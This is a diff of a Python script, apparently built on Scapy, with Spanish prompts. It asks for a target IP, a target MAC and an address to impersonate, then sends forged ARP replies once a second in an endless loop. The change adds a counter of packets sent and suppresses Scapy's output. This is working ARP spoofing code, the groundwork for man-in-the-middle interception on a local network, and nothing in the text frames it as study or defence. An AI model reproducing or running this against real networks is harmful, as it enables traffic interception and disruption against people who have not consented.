@@ -64,8 +64,6 @@ try:
         subprocess.call(["ifconfig", options.interface, "up"])
 
         subprocess.call(["ip", "--color", "link", "show", options.interface])
-        
-        pass
 
 
     # RESPUESTA ARP
@@ -73,12 +71,16 @@ try:
     targetIp = input("Introduce la IP del objetivo: ")
     targetMac = input("Introduce la MAC del objetivo: ")
     ipSpoof = input("Introduce la IP a spoofear: ")
-
+    
+    packetCount = 0
     while True:
         packet = ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=ipSpoof)  # Se crea la respuesta ARP ( op = 2 )
+        send(packet, verbose=False)
+        packetCount += 1
+        print ( "[+] Paquetes enviados: " + str(packetCount), end="\r")
         sleep(1)
-        send(packet)
 
 except KeyboardInterrupt:
     print ("Se ha interrumpido el script...")
     exit()
+
